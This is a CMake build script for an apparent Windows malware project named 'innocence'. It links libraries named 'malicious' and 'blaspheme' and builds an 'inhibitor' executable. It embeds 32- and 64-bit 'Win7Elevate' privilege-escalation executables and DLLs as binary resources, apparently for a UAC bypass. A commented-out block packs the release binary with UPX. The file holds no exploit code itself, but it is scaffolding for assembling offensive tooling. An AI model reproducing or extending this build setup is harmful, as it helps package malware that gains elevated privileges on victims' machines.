file(GLOB_RECURSE substrate_source_files substrate/*.hpp substrate/*.cpp)
add_library(substrate SHARED ${substrate_source_files})
target_link_libraries(substrate system network blaspheme malicious common userenv)

# ressource generator will create headers with binary resources
set(BINGENERATOR "${CMAKE_SOURCE_DIR}/utils/bin2array.exe")
set(COMPRESSOR "${CMAKE_SOURCE_DIR}/utils/upx.exe")

set(SUBSTRATE_HPP_PATH "${BINARY_OUTPUT}/SubstrateDll.hpp")
set(SUBSTRATE_DLL_PATH "${BINARY_OUTPUT}/substrate.dll")

set(ELEVATOR32_HPP_PATH "${BINARY_OUTPUT}/Elevator32.hpp")
set(ELEVATOR32_EXE_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/Win32/Release/Win7Elevate32v2.exe")

set(ELEVATORDLL32_HPP_PATH "${BINARY_OUTPUT}/ElevatorDll32.hpp")
set(ELEVATORDLL32_DLL_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/Win32/Release/Win7ElevateDll32.dll")

set(ELEVATOR64_HPP_PATH "${BINARY_OUTPUT}/Elevator64.hpp")
set(ELEVATOR64_EXE_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/x64/Release/Win7Elevate64v2.exe")

set(ELEVATORDLL64_HPP_PATH "${BINARY_OUTPUT}/ElevatorDll64.hpp")
set(ELEVATORDLL64_DLL_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/x64/Release/Win7ElevateDll64.dll")

message(STATUS "BINGENERATOR = ${BINGENERATOR}")

message(STATUS "SUBSTRATE_HPP_PATH = ${SUBSTRATE_HPP_PATH}")
message(STATUS "SUBSTRATE_DLL_PATH = ${SUBSTRATE_DLL_PATH}")

message(STATUS "ELEVATOR32_HPP_PATH = ${ELEVATOR32_HPP_PATH}")
message(STATUS "ELEVATOR32_EXE_PATH = ${ELEVATOR32_EXE_PATH}")

message(STATUS "ELEVATORDLL32_HPP_PATH = ${ELEVATORDLL32_HPP_PATH}")
message(STATUS "ELEVATORDLL32_DLL_PATH = ${ELEVATORDLL32_DLL_PATH}")

message(STATUS "ELEVATOR64_HPP_PATH = ${ELEVATOR64_HPP_PATH}")
message(STATUS "ELEVATOR64_EXE_PATH = ${ELEVATOR64_EXE_PATH}")

message(STATUS "ELEVATORDLL64_HPP_PATH = ${ELEVATORDLL64_HPP_PATH}")
message(STATUS "ELEVATORDLL64_DLL_PATH = ${ELEVATORDLL64_DLL_PATH}")

add_custom_command(
	TARGET substrate
	POST_BUILD
	COMMAND "${BINGENERATOR}" "${SUBSTRATE_DLL_PATH}" "${SUBSTRATE_HPP_PATH}" "SubstrateDll"
	COMMENT "Generating ${SUBSTRATE_HPP_PATH} WITH ${SUBSTRATE_DLL_PATH}"
)

file(GLOB_RECURSE inhibitor_source_files inhibitor/*)
add_executable(inhibitor WIN32 ${inhibitor_source_files})

# generation of privilege escalation executable 32bit
add_custom_command(
	TARGET inhibitor
	PRE_BUILD
	COMMAND "${BINGENERATOR}" "${ELEVATOR32_EXE_PATH}" "${ELEVATOR32_HPP_PATH}" "Elevator32"
	COMMENT "Generating ${ELEVATOR_HPP32_PATH} WITH ${ELEVATOR32_EXE_PATH}"
)

# generation of privilege escalation DLL 32bit
add_custom_command(
	TARGET inhibitor
	PRE_BUILD
	COMMAND "${BINGENERATOR}" "${ELEVATORDLL32_DLL_PATH}" "${ELEVATORDLL32_HPP_PATH}" "ElevatorDll32"
	COMMENT "Generating ${ELEVATORDLL32_HPP_PATH} WITH ${ELEVATORDLL32_DLL_PATH}"
)

# generation of privilege escalation executable 64bit
add_custom_command(
	TARGET inhibitor
	PRE_BUILD
	COMMAND "${BINGENERATOR}" "${ELEVATOR64_EXE_PATH}" "${ELEVATOR64_HPP_PATH}" "Elevator64"
	COMMENT "Generating ${ELEVATOR64_HPP_PATH} WITH ${ELEVATOR64_EXE_PATH}"
)

# generation of privilege escalation DLL 64bit
add_custom_command(
	TARGET inhibitor
	PRE_BUILD
	COMMAND "${BINGENERATOR}" "${ELEVATORDLL64_DLL_PATH}" "${ELEVATORDLL64_HPP_PATH}" "ElevatorDll64"
	COMMENT "Generating ${ELEVATORDLL64_HPP_PATH} WITH ${ELEVATORDLL64_DLL_PATH}"
)

# substrate has to be built before inhibitor, because of resource inclusion
target_link_libraries(inhibitor common malicious system network substrate shlwapi)
install(TARGETS inhibitor RUNTIME DESTINATION innocence)

# UPX Compression
#if ( CMAKE_BUILD_TYPE MATCHES Debug)
#	message(STATUS "Compressing disabled")
#elseif( CMAKE_BUILD_TYPE MATCHES Release)
#	if(WIN32)
#		message(STATUS "Compression activee sur ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}")
#		add_custom_command(
#			TARGET inhibitor
#			POST_BUILD
#			COMMAND "C:/innocence/compress.bat"
#			COMMENT "Compressing ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}"
#		)
#	endif()
#endif ()
